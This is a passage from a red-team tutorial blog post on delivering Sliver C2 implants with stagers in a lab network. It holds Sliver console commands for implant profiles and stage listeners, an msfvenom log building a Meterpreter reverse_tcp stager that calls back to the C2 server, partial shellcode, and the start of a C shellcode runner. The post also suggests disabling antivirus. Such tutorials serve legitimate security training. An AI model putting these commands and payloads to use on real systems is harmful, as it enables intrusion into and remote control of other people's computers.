<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta name="generator" content="Hugo 0.92.2" />
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Learning Sliver C2 (06) - Stagers: Basics | text/plain</title>
    <meta name="description" content="A demonstration of the various ways in which Sliver C2 implants can be delivered with stagers.
First I&#39;ll show basic stagers generated by Sliver itself.
After that, there will be three custom stagers written in C&#43;&#43;, C# and PowerShell.
">
    <meta name="keywords" content="c2, sliver, tutorial, stagers">
    
    
    
    
    

  <meta name="author" content="Dominic Breuker">


    <meta property="og:title" content="Learning Sliver C2 (06) - Stagers: Basics" />
<meta property="og:description" content="A demonstration of the various ways in which Sliver C2 implants can be delivered with stagers.
First I&#39;ll show basic stagers generated by Sliver itself.
After that, there will be three custom stagers written in C&#43;&#43;, C# and PowerShell.
" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://dominicbreuker.com/post/learning_sliver_c2_06_stagers/" /><meta property="og:image" content="https://dominicbreuker.com/img/avatar.png"/><meta property="article:section" content="post" />
<meta property="article:published_time" content="2022-09-30T00:00:00+00:00" />
<meta property="article:modified_time" content="2022-09-30T00:00:00+00:00" />


    



  <meta property="og:image" content="img/avatar.png">


    <meta name="theme-color" content="#000">

    
    
    
    
    <link rel="canonical" href="https://dominicbreuker.com/post/learning_sliver_c2_06_stagers/">
    
    
    <link rel="icon" sizes="any" href="data:image/svg+xml,%3Csvg%20viewBox='0%200%2046%2045'%20xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3EAfter%20Dark%3C/title%3E%3Cpath%20d='M.708%2045L23%20.416%2045.292%2045H.708zM35%2038L23%2019%2011%2038h24z'%20fill='%23000'/%3E%3C/svg%3E">

    <style>
  html{font-size:12px}*{box-sizing:border-box;text-rendering:geometricPrecision}body{font-size:1rem;line-height:1.5rem;margin:0;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif;word-wrap:break-word}h1,h2,h3,h4,h5,h6{line-height:1.3em}fieldset{border:none;padding:0;margin:0}pre{padding:2rem;margin:1.75rem 0;background-color:#fff;border:1px solid #ccc;overflow:auto}code[class*=language-],pre[class*=language-],pre code{font-weight:100;text-shadow:none;margin:1.75rem 0}a{cursor:pointer;color:#ff2e88;text-decoration:none;border-bottom:1px solid #ff2e88}a:hover{background-color:#ff2e88;color:#fff}.grid{display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap}.grid.\-top{-ms-flex-align:start;-ms-grid-row-align:flex-start;align-items:flex-start}.grid.\-middle{-ms-flex-align:center;-ms-grid-row-align:center;align-items:center}.grid.\-bottom{-ms-flex-align:end;-ms-grid-row-align:flex-end;align-items:flex-end}.grid.\-stretch{-ms-flex-align:stretch;-ms-grid-row-align:stretch;align-items:stretch}.grid.\-baseline{-ms-flex-align:baseline;-ms-grid-row-align:baseline;align-items:baseline}.grid.\-left{-ms-flex-pack:start;justify-content:flex-start}.grid.\-center{-ms-flex-pack:center;justify-content:center}.grid.\-right{-ms-flex-pack:end;justify-content:flex-end}.grid.\-between{-ms-flex-pack:justify;justify-content:space-between}.grid.\-around{-ms-flex-pack:distribute;justify-content:space-around}.cell{-ms-flex:1;flex:1;box-sizing:border-box}@media screen and (min-width:768px){.cell.\-1of12{-ms-flex:0 0 8.33333%;flex:0 0 8.33333%}.cell.\-2of12{-ms-flex:0 0 16.66667%;flex:0 0 16.66667%}.cell.\-3of12{-ms-flex:0 0 25%;flex:0 0 25%}.cell.\-4of12{-ms-flex:0 0 33.33333%;flex:0 0 33.33333%}.cell.\-5of12{-ms-flex:0 0 41.66667%;flex:0 0 41.66667%}.cell.\-6of12{-ms-flex:0 0 50%;flex:0 0 50%}.cell.\-7of12{-ms-flex:0 0 58.33333%;flex:0 0 58.33333%}.cell.\-8of12{-ms-flex:0 0 66.66667%;flex:0 0 66.66667%}.cell.\-9of12{-ms-flex:0 0 75%;flex:0 0 75%}.cell.\-10of12{-ms-flex:0 0 83.33333%;flex:0 0 83.33333%}.cell.\-11of12{-ms-flex:0 0 91.66667%;flex:0 0 91.66667%}}@media screen and (max-width:768px){.grid{-ms-flex-direction:column;flex-direction:column}.cell{-ms-flex:0 0 auto;flex:0 0 auto}}.hack,.hack blockquote,.hack code,.hack em,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack strong{font-size:1rem;font-style:normal;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif}.hack blockquote,.hack code,.hack em,.hack strong{line-height:20px}.hack blockquote,.hack code,.hack footer,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack header,.hack li,.hack ol,.hack p,.hack section,.hack ul{float:none;margin:0;padding:0}.hack blockquote,.hack h1,.hack ol,.hack p,.hack ul{margin-top:20px;margin-bottom:20px}.hack h1{position:relative;display:inline-block;display:table-cell;padding:20px 0 30px;margin:0;overflow:hidden}.hack h1:after{content:"====================================================================================================";position:absolute;bottom:10px;left:0}.hack h1+*{margin-top:0}.hack h2,.hack h3,.hack h4,.hack h5,.hack h6{position:relative;margin-bottom:1.75rem}.hack h2:before,.hack h3:before,.hack h4:before,.hack h5:before,.hack h6:before{display:inline}.hack h2:before{content:"## "}.hack h3:before{content:"### "}.hack h4:before{content:"#### "}.hack h5:before{content:"##### "}.hack h6:before{content:"###### "}.hack li{position:relative;display:block;padding-left:20px}.hack li:after{position:absolute;top:0;left:0}.hack ul>li:after{content:"-"}.hack ol{counter-reset:a}.hack ol>li:after{content:counter(a) ".";counter-increment:a}.hack blockquote{position:relative;padding-left:17px;padding-left:2ch;overflow:hidden}.hack blockquote:after{content:">\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>";white-space:pre;position:absolute;top:0;left:0;line-height:20px}.hack em:after,.hack em:before{content:"*";display:inline}.hack pre code:after,.hack pre code:before{content:''}.hack code{font-weight:700}.hack code:after,.hack code:before{content:"`";display:inline}.hack hr{position:relative;height:20px;overflow:hidden;border:0;margin:20px 0}.hack hr:after{content:"----------------------------------------------------------------------------------------------------";position:absolute;top:0;left:0;line-height:20px;width:100%;word-wrap:break-word}@-moz-document url-prefix(){.hack h1{display:block}}.hack-ones ol>li:after{content:"1."}p{margin:0 0 1.75rem}.container{max-width:70rem}.container,.container-fluid{margin:0 auto;padding:0 1rem}.inner{padding:1rem}.inner2x{padding:2rem}.pull-left{float:left}.pull-right{float:right}.progress-bar{height:8px;opacity:.8;background-color:#ccc;margin-top:12px}.progress-bar.progress-bar-show-percent{margin-top:38px}.progress-bar-filled{background-color:gray;height:100%;transition:width .3s ease;position:relative;width:0}.progress-bar-filled:before{content:'';border:6px solid transparent;border-top-color:gray;position:absolute;top:-12px;right:-6px}.progress-bar-filled:after{color:gray;content:attr(data-filled);display:block;font-size:12px;white-space:nowrap;position:absolute;border:6px solid transparent;top:-38px;right:0;-ms-transform:translateX(50%);transform:translateX(50%)}table{width:100%;border-collapse:collapse;margin:1.75rem 0;color:#778087}table td,table th{vertical-align:top;border:1px solid #ccc;line-height:15px;padding:10px}table thead th{font-size:10px}table tbody td:first-child{font-weight:700;color:#333}.form{width:30rem}.form-group{margin-bottom:1.75rem;overflow:auto}.form-group label{border-bottom:2px solid #ccc;color:#333;width:10rem;display:inline-block;height:38px;line-height:38px;padding:0;float:left;position:relative}.form-group.form-success label{color:#4caf50!important;border-color:#4caf50!important}.form-group.form-warning label{color:#ff9800!important;border-color:#ff9800!important}.form-group.form-error label{color:#f44336!important;border-color:#f44336!important}.form-control{outline:none;border:none;border-bottom:2px solid #ccc;padding:.5rem 0;width:20rem;height:38px;background-color:transparent}.form-control:focus{border-color:#555}.form-group.form-textarea label:after{position:absolute;content:'';width:2px;background-color:#fff;right:-2px;top:0;bottom:0}textarea.form-control{height:auto;resize:none;padding:1rem 0;border-bottom:2px solid #ccc;border-left:2px solid #ccc;padding:.5rem}select.form-control{border-radius:0;background-color:transparent;-webkit-appearance:none;-moz-appearance:none;-ms-appearance:none}.help-block{color:#999;margin-top:.5rem}.form-actions{margin-bottom:1.75rem}.btn{display:-ms-inline-flexbox;display:inline-flex;-ms-flex-align:center;align-items:center;-ms-flex-pack:center;justify-content:center;cursor:pointer;outline:none;padding:.65rem 2rem;font-size:1rem;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;position:relative;z-index:1}.btn:active{box-shadow:inset 0 1px 3px rgba(0,0,0,.12)}.btn.btn-ghost{border-color:#757575;color:#757575;background-color:transparent}.btn.btn-ghost:focus,.btn.btn-ghost:hover{border-color:#424242;color:#424242;z-index:2}.btn.btn-ghost:hover{background-color:transparent}.btn-block{width:100%;display:-ms-flexbox;display:flex}.btn-default{color:#fff;background-color:#e0e0e0;border:1px solid #e0e0e0;color:#333}.btn-default:focus:not(.btn-ghost),.btn-default:hover{background-color:#dcdcdc;border-color:#dcdcdc}.btn-success{color:#fff;background-color:#4caf50;border:1px solid #4caf50}.btn-success:focus:not(.btn-ghost),.btn-success:hover{background-color:#43a047;border-color:#43a047}.btn-success.btn-ghost{border-color:#4caf50;color:#4caf50}.btn-success.btn-ghost:focus,.btn-success.btn-ghost:hover{border-color:#388e3c;color:#388e3c;z-index:2}.btn-error{color:#fff;background-color:#f44336;border:1px solid #f44336}.btn-error:focus:not(.btn-ghost),.btn-error:hover{background-color:#e53935;border-color:#e53935}.btn-error.btn-ghost{border-color:#f44336;color:#f44336}.btn-error.btn-ghost:focus,.btn-error.btn-ghost:hover{border-color:#d32f2f;color:#d32f2f;z-index:2}.btn-warning{color:#fff;background-color:#ff9800;border:1px solid #ff9800}.btn-warning:focus:not(.btn-ghost),.btn-warning:hover{background-color:#fb8c00;border-color:#fb8c00}.btn-warning.btn-ghost{border-color:#ff9800;color:#ff9800}.btn-warning.btn-ghost:focus,.btn-warning.btn-ghost:hover{border-color:#f57c00;color:#f57c00;z-index:2}.btn-info{color:#fff;background-color:#00bcd4;border:1px solid #00bcd4}.btn-info:focus:not(.btn-ghost),.btn-info:hover{background-color:#00acc1;border-color:#00acc1}.btn-info.btn-ghost{border-color:#00bcd4;color:#00bcd4}.btn-info.btn-ghost:focus,.btn-info.btn-ghost:hover{border-color:#0097a7;color:#0097a7;z-index:2}.btn-primary{color:#fff;background-color:#2196f3;border:1px solid #2196f3}.btn-primary:focus:not(.btn-ghost),.btn-primary:hover{background-color:#1e88e5;border-color:#1e88e5}.btn-primary.btn-ghost{border-color:#2196f3;color:#2196f3}.btn-primary.btn-ghost:focus,.btn-primary.btn-ghost:hover{border-color:#1976d2;color:#1976d2;z-index:2}.btn-group{overflow:auto}.btn-group .btn{float:left}.btn-group .btn-ghost:not(:first-child){margin-left:-1px}.card{border:1px solid #ccc}.card .card-header{color:#333;text-align:center;background-color:#ddd;padding:.5rem 0}.alert{color:#ccc;padding:1rem;border:1px solid #ccc;margin-bottom:1.75rem}.alert-success{color:#4caf50;border-color:#4caf50}.alert-error{color:#f44336;border-color:#f44336}.alert-info{color:#00bcd4;border-color:#00bcd4}.alert-warning{color:#ff9800;border-color:#ff9800}.media:not(:last-child){margin-bottom:1.25rem}.media-left{padding-right:1rem}.media-left,.media-right{display:table-cell;vertical-align:top}.media-right{padding-left:1rem}.media-body{display:table-cell;vertical-align:top}.media-heading{font-size:1.16667rem;font-weight:700}.media-content{margin-top:.3rem}.avatarholder,.placeholder{background-color:#f0f0f0;text-align:center;color:#b9b9b9;font-size:1rem;border:1px solid #f0f0f0}.avatarholder{width:48px;height:48px;line-height:46px;font-size:2rem;background-size:cover;background-position:50%;background-repeat:no-repeat}.avatarholder.rounded{border-radius:33px}.loading{display:inline-block;content:'&nbsp;';height:20px;width:20px;margin:0 .5rem;animation:a .6s infinite linear;border:2px solid #e91e63;border-right-color:transparent;border-radius:50%}.btn .loading{margin-bottom:0;width:14px;height:14px}.btn div.loading{float:left}.alert .loading{margin-bottom:-5px}@keyframes a{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}.menu{width:100%}.menu .menu-item{display:block;color:#616161;border-color:#616161}.menu .menu-item.active,.menu .menu-item:hover{color:#000;border-color:#000;background-color:transparent}@media screen and (max-width:768px){.form-group label{display:block;border-bottom:none;width:100%}.form-group.form-textarea label:after{display:none}.form-control{width:100%}textarea.form-control{border-left:none;padding:.5rem 0}pre::-webkit-scrollbar{height:3px}}@media screen and (max-width:480px){.form{width:100%}}.dark{color:#ccc}.dark,.dark pre{background-color:#000}.dark pre{padding:0;border:none}.dark pre code{color:#00bcd4}.dark h1 a,.dark h2 a,.dark h3 a,.dark h4 a,.dark h5 a{color:#ccc}.dark code,.dark strong{color:#fff}.dark code{font-weight:100}.dark table{color:#ccc}.dark table td,.dark table th{border-color:#444}.dark table tbody td:first-child{color:#fff}.dark .form-group label{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .form-group.form-textarea label:after{background-color:#000}.dark .form-control{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .form-control:focus{border-color:#ccc;color:#ccc}.dark textarea.form-control{color:#ccc}.dark .card{border-color:rgba(95,95,95,.78)}.dark .card .card-header{background-color:transparent;color:#ccc;border-bottom:1px solid rgba(95,95,95,.78)}.dark .btn.btn-ghost.btn-default{border-color:#ababab;color:#ababab}.dark .btn.btn-ghost.btn-default:focus,.dark .btn.btn-ghost.btn-default:hover{border-color:#9c9c9c;color:#9c9c9c;z-index:1}.dark .btn.btn-ghost.btn-default:focus,.dark .btn.btn-ghost.btn-default:hover{border-color:#e0e0e0;color:#e0e0e0}.dark .btn.btn-ghost.btn-primary:focus,.dark .btn.btn-ghost.btn-primary:hover{border-color:#64b5f6;color:#64b5f6}.dark .btn.btn-ghost.btn-success:focus,.dark .btn.btn-ghost.btn-success:hover{border-color:#81c784;color:#81c784}.dark .btn.btn-ghost.btn-info:focus,.dark .btn.btn-ghost.btn-info:hover{border-color:#4dd0e1;color:#4dd0e1}.dark .btn.btn-ghost.btn-error:focus,.dark .btn.btn-ghost.btn-error:hover{border-color:#e57373;color:#e57373}.dark .btn.btn-ghost.btn-warning:focus,.dark .btn.btn-ghost.btn-warning:hover{border-color:#ffb74d;color:#ffb74d}.dark .avatarholder,.dark .placeholder{background-color:transparent;border-color:#333}.dark .menu .menu-item{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .menu .menu-item.active,.dark .menu .menu-item:hover{color:#fff;border-color:#ccc}
  :root {
  --screen-size-small: 30em; /* breakpoint reference only */
}
@keyframes intro {
  0% {
    opacity: 0;
  }
  100% {
    opacity: 1;
  }
}
.muted {
  color: rgba(255, 255, 255, 0.5);
}
.readmore {
  margin-bottom: 2.2em;
}
.responsive-iframe {
  position: relative;
  padding-bottom: 56.25%; /* 16:9 */
  padding-top: 25px;
  height: 0;
}
.responsive-iframe iframe {
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
}
iframe {
  border: 0;
}
main, footer {
  animation: intro 0.3s both;
  animation-delay: 0.15s;
}
footer time[datetime$="M"]:before {
  content: "\2013\0020";
}
@media only screen
  and ( max-width: 30em ) {
  footer time[datetime$="M"] {
    display: none;
  }
}
blockquote cite {
  display: block;
}
blockquote cite::before {
   content: "\2014";
}
:target {
  color: #fff;
}
/* hack.css overrides and enhancements */
.hack li ul {
  margin: 0;
}
.main {
  padding: 20px 10px;
}
nav a.active {
  background-color: #ff2e88;
  color: #fff;
}
a[itemprop="url"] {
  color: #ff9800;
}
a[itemprop="url"]:hover {
  color: #fff;
}
a[href*="://"]::after,
a[rel*="external"] {
  content: " " url("data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20class='i-external'%20viewBox='0%200%2032%2032'%20width='14'%20height='14'%20fill='none'%20stroke='%23ff9800'%20stroke-linecap='round'%20stroke-linejoin='round'%20stroke-width='9.38%'%3E%3Cpath%20d='M14%209%20L3%209%203%2029%2023%2029%2023%2018%20M18%204%20L28%204%2028%2014%20M28%204%20L14%2018'/%3E%3C/svg%3E");
}
figure a[href*="://"]::after,
figure a[rel*="external"] {
  content: "";
}
html {
  font-size: 13px;
}
.hack pre {
  font-size: 17px;
}
article [itemprop="description"] {
  margin-bottom: 20px;
  margin-top: 20px;
}
@media screen and (min-width: 768px) {
  html {
    font-size: 1em;
  }
  .container {
    max-width: 50rem;
  }
}

  nav a.active {
  background-color: #33cc33; /*ff2e88*/
  color: #fff;
}
a[itemprop="url"] {
  color: #339933; /*ff9800*/
}
a[itemprop="url"]:hover {
  color: #fff;
  background-color: #33cc33; /*ff2e88*/
}

.dark pre code {
  color: #248f24;
}

.dark code {
  color: #248f24;
}

a {
  color: #339933; /*ff9800*/
  border-bottom: 1px solid #33cc33;
}

a:hover {
  color: #fff;
  background-color: #33cc33; /*ff2e88*/
}

/* custom styles */
figure {
  margin-left: auto;
  margin-right: auto;
  text-align: center;
}
figure img {
  max-width: 100%;
}
figure a {
  border-bottom: none !important;
}
figure a:hover {
  background-color: inherit !important;
}

input:invalid {
  border-bottom: 2px solid #f44336 !important;
}

input:valid {
  border-bottom: 2px solid #ccc;
}

</style>

    
    
      <script async src="/js/lazysizes.min.js"></script>
    
    
      <script async src="/js/bpgdec8a.js"></script>
      <script async src="/js/bpgdec8.js"></script>
      <script async src="/js/bpgdec.js"></script>
    
  </head>
  
  <body class="hack dark main container">
    <header>
  
  <nav itemscope itemtype="http://schema.org/SiteNavigationElement">
    
    
      <a itemprop="url" class="" href="/"><span itemprop="name">Home</span></a>
    
      <a itemprop="url" class="" href="/post/"><span itemprop="name">Post</span></a>
    
      <a itemprop="url" class="" href="/encoders/"><span itemprop="name">Encoders</span></a>
    
      <a itemprop="url" class="" href="/about/"><span itemprop="name">About</span></a>
    
  </nav>


</header>
    <main>
  <article itemscope itemtype="http://schema.org/BlogPosting">
    <meta itemprop="name" content="Learning Sliver C2 (06) - Stagers: Basics">
<meta itemprop="description" content="A demonstration of the various ways in which Sliver C2 implants can be delivered with stagers.
First I&#39;ll show basic stagers generated by Sliver itself.
After that, there will be three custom stagers written in C&#43;&#43;, C# and PowerShell.
"><meta itemprop="datePublished" content="2022-09-30T00:00:00+00:00" />
<meta itemprop="dateModified" content="2022-09-30T00:00:00+00:00" />
<meta itemprop="wordCount" content="5379"><meta itemprop="image" content="https://dominicbreuker.com/img/avatar.png"/>
<meta itemprop="keywords" content="c2,sliver,tutorial,stagers," />
    <script async src="/js/baffle.js"></script>
    <header>
      <h1 class="baffle" itemprop="headline">Learning Sliver C2 (06) - Stagers: Basics</h1>
      <p class="muted">
        <svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
  <circle cx="16" cy="16" r="14" />
  <path d="M16 8 L16 16 20 20" />
</svg>
<span>26 minute read</span>
<svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
  <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z" />
</svg>

  Published: <time datetime="2022-09-30T00:00:00&#43;00:00">30 Sep, 2022</time>


      </p>
    </header>
    
      <blockquote itemprop="description">A demonstration of the various ways in which Sliver C2 implants can be delivered with stagers.
First I&#39;ll show basic stagers generated by Sliver itself.
After that, there will be three custom stagers written in C&#43;&#43;, C# and PowerShell.
</blockquote>
    
    
  <details>
    <summary>Table of Contents</summary>
    <nav id="TableOfContents">
  <ul>
    <li><a href="#introduction">Introduction</a></li>
    <li><a href="#preparations">Preparations</a></li>
    <li><a href="#getting-started-with-stagers">Getting started with stagers</a></li>
    <li><a href="#custom-stagers">Custom stagers</a>
      <ul>
        <li><a href="#c-stager">C++ stager</a></li>
        <li><a href="#c-net-stager">C# .NET Stager</a></li>
        <li><a href="#powershell-stager">PowerShell Stager</a></li>
      </ul>
    </li>
  </ul>
</nav>
  </details>
  <script>
    const el = document.querySelector('details summary')
    el.onclick = () => {
      (function(l,o,a,d,e,r){e=o.createElement(a),r=o.getElementsByTagName(a)[0];e.async=1;e.src=d;r.parentNode.insertBefore(e,r)})(window,document,'script','/js/smoothscroll.js');
      el.onclick = null
    }
    document.querySelectorAll('#TableOfContents a').forEach(link => {
      link.addEventListener('click', () => {
        document.querySelector(
          link.href.slice(link.href.indexOf('#'))
        ).scrollIntoView({ behavior: 'smooth' })
      })
    })
  </script>


    <div itemprop="articleBody">
      <h1 id="sliver-c2">Sliver C2</h1>
<p>This post is part of a tutorial blog post series on Sliver C2 (v1.5.16).
For an overview: <a href="../../post/learning_sliver_c2_01_installation/#series-overview">click here</a>.</p>
<h2 id="introduction">Introduction</h2>
<p>Sliver C2 implants will often be delivered with a small script or program called a &ldquo;stager&rdquo;.
Such a program downloads implant shellcode from a remote location, such as the C2 server, and then runs the shellcode.
At first sight, this sounds unnecessarily complicated.
Why not execute the implant directly instead of a stager?
There are several why you might want to do that.</p>
<p>Sliver implants are written in Go and Go binaries are <a href="https://news.ycombinator.com/item?id=26832243">known to be huge</a>.
My personal experience is that you never get anything below 2MB out of the Go compiler,
even if all you do is Hello World.
Sliver implants are packed with features, so expect them to be 10MB, probably bigger in the future.
A stager can be only a few KBs or even just a short script.
While size does not matter to much anymore in computing these days,
it still makes it considerably harder to hide an implant somewhere.</p>
<p>Sliver implants provide some basic obfuscation but they are not designed for AV or EDR evasion.
In my previous posts on Sliver, I&rsquo;ve recommended to
<a href="../../post/learning_sliver_c2_02_beacons_and_sessions/#prepare-the-target">disable all AV</a>,
since every EXE Sliver compiles will be blocked by Defender.
Thus, you need another program to take care of AV before loading the implant anyways.
This program could be your stager.</p>
<p>The way stagers work in Sliver is fairly simple (c.f. <a href="https://github.com/BishopFox/sliver/wiki/Stagers">official docs</a>).
First you create a &ldquo;profile&rdquo;, which is basically a definition of an implant configuration.
I&rsquo;ve used them before <a href="../../post/learning_sliver_c2_02_beacons_and_sessions/#profiles">here</a>.
Given a profile, you create a &ldquo;stage listener&rdquo; for it, which will serve the implant shellcode.
The listener can serve it via a plain TCP connection or via HTTP(S).
Finally, all that&rsquo;s left is to download the shellcode and run it where you want it to run.
That&rsquo;s the hard part.</p>
<p>Sliver can itself generate stagers, which are very small pieces of shellcode communicating with
your stage listener. You may be able to deliver such shellcode with an exploit, or make it part of
yet another program that just loads and executes it. The latter is what I&rsquo;ll demonstrate below.</p>
<p>The alternative is to just develop your own stager. This is not as hard as it may sound since
the staging protocol is very simple. TCP stage listeners serve the size of the shellcode in the
first 4 bytes, then send the shellcode. The HTTP and HTTPS stage listeners just send the shellcode
in the HTTP response body. Should not be too hard to build a client for that.
Below, I&rsquo;ll show three examples for custom stagers connecting to an HTTP listener, written
in C++, C# and PowerShell.</p>
<h2 id="preparations">Preparations</h2>
<p>All experiments below were done in a lab environment. Posts
<a href="../../post/learning_sliver_c2_01_installation/">1</a> to
<a href="../../post/learning_sliver_c2_05_transports_in_detail_dns/">5</a>
show how I created it. For this post, the details don&rsquo;t matter too much.
What you need to know is this. There is:</p>
<ul>
<li>a target running Windows which we want to infect (192.168.122.32)</li>
<li>a Sliver C2 server generating implant shellcode and running stage listeners (192.168.122.111 / sliver.labnet.local)</li>
<li>a proxy server running Squid and a DNS service to resolve domain names in the lab (192.168.122.185)</li>
</ul>
<h2 id="getting-started-with-stagers">Getting started with stagers</h2>
<p>We start with a very simple example.
Let&rsquo;s serve an mTLS implant.
The first step is to generate the profile, which we do on the C2 server after connecting to Sliver.
With the command seen below, you get one for an mTLS implant in 64 bit shellcode format.
<code>--skip-symbols</code> disables obfuscation, which speeds up the build (AV is off, so why care ¯\_(ツ)_/¯)</p>
<pre tabindex="0"><code>sliver &gt;  profiles new --mtls sliver.labnet.local --skip-symbols --format shellcode --arch amd64 win64

[*] Saved new implant profile win64

sliver &gt; profiles 

 Profile Name   Implant Type   Platform        Command &amp; Control                     Debug   Format      Obfuscation   Limitations 
============== ============== =============== ===================================== ======= =========== ============= =============
 win64          session        windows/amd64   [1] mtls://sliver.labnet.local:8888   false   SHELLCODE   disabled
</code></pre><p>The reason we do all of this is to get an mTLS session in the end.
Before we get lost in the details and forget about that, it&rsquo;s better to start the listener now:</p>
<pre tabindex="0"><code>sliver &gt; mtls

[*] Starting mTLS listener ...
[*] Successfully started job #1

sliver &gt; jobs

 ID   Name   Protocol   Port 
==== ====== ========== ======
 1    mtls   tcp        8888
</code></pre><p>The other listener we need is the stage listener.
You can start it with the <code>stage-listener</code> command.
It want&rsquo;s to know it&rsquo;s URL and the implant profile which should be served by it.
When you started it, confirm with <code>jobs</code> that everything runs as expected:</p>
<pre tabindex="0"><code>sliver &gt; stage-listener --url tcp://sliver.labnet.local:8443 --profile win64

[*] No builds found for profile win64, generating a new one
[*] Job 2 (tcp) started

sliver &gt; jobs

 ID   Name   Protocol   Port 
==== ====== ========== ======
 1    mtls   tcp        8888
 2    TCP    tcp        8443
</code></pre><p>Now it&rsquo;s time to create the stager.
This is done with <code>generate stager</code>.
Similar to Metasploit, you define a local host and port to tell it where the stage listener is.
Below, I also specify that the result should be 64 bit shellcode.
Here is the command and it&rsquo;s arguments:</p>
<pre tabindex="0"><code>sliver &gt; generate stager --lhost sliver.labnet.local --lport 8443 --arch amd64 --format c --save /tmp

[*] Sliver implant stager saved to: /tmp/SOLID_TOSSER
</code></pre><p>The <a href="https://github.com/BishopFox/sliver/blob/93e772f5bf81c59ca25033e1d6d40138f615b4b8/client/command/generate/generate-stager.go#L18">source code</a>
for this command suggests that it is little more than a wrapper for
<code>msfvenom</code>. Under the hood, <a href="https://github.com/BishopFox/sliver/blob/37a46a21e06fe24c8bb0b5bf928ac8538872c8af/server/rpc/rpc-msf.go#L148">this function</a>
is called which generates a <code>windows/x64/meterpreter/reverse_tcp</code> stager.
You can follow the Sliver logs on the C2 server at <code>/root/.sliver/logs/sliver.log</code>
to see exactly which arguments are passed to <code>msfvenom</code>. For example,
the command above creates logs like this:</p>
<pre tabindex="0"><code>┌──(root㉿kali)-[~]
└─# tail -f /root/.sliver/logs/sliver.log
...
INFO[2022-09-08T22:21:09+02:00] [sliver/server/msf/msf.go:195] msfvenom [--platform windows --arch x64 --format c --payload windows/x64/meterpreter/reverse_tcp LHOST=192.168.122.111 LPORT=8443 EXITFUNC=thread] 
INFO[2022-09-08T22:21:17+02:00] [sliver/server/msf/msf.go:202] /usr/bin/msfvenom --platform windows --arch x64 --format c --payload windows/x64/meterpreter/reverse_tcp LHOST=192.168.122.111 LPORT=8443 EXITFUNC=thread 
INFO[2022-09-08T22:21:17+02:00] [github.com/grpc-ecosystem/go-grpc-middleware@v1.2.2/logging/logrus/options.go:211] finished unary call with code OK
...
</code></pre><p>An interesting observation is that even though you can specify a DNS name for <code>--lhost</code>,
the stager will only connect to the hardcoded IP as resolved by the C2 server
during stager generation. The <code>LHOST</code> passed to <code>msfvenom</code> above was <code>192.168.122.111</code>.</p>
<p>After this short detour into the internals of Sliver, it&rsquo;s time to have a look at the result.
We have some brand-new shellcode in C format:</p>
<pre tabindex="0"><code>└─$ cat /tmp/SOLID_TOSSER 
unsigned char buf[] = 
&quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52&quot;
&quot;\x48\x31\xd2\x51\x56\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;
...
&quot;\xff\xe7\x58\x6a\x00\x59\xbb\xe0\x1d\x2a\x0a\x41\x89\xda\xff&quot;
&quot;\xd5&quot;;
</code></pre><p>My first thought: what am I supposed to do with that? How do I get something I can double-click?
Subsequently I&rsquo;ve played a bit with the <code>--format</code> argument and all I ever got was shellcode.
This one is not for script kiddies. You really have to do the job yourself.
Time to build something that runs the code:</p>
<p>The smallest possible program I&rsquo;m aware of to get the job done is this,
which I&rsquo;ve put into a file <code>runner.c</code> (on the C2 server):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;windows.h&#34;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
{
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> shellcode[] <span style="color:#f92672">=</span>
    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52</span><span style="color:#e6db74">&#34;</span>
    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x31\xd2\x51\x56\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48</span><span style="color:#e6db74">&#34;</span>
    ...
    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4\x41</span><span style="color:#e6db74">&#34;</span>
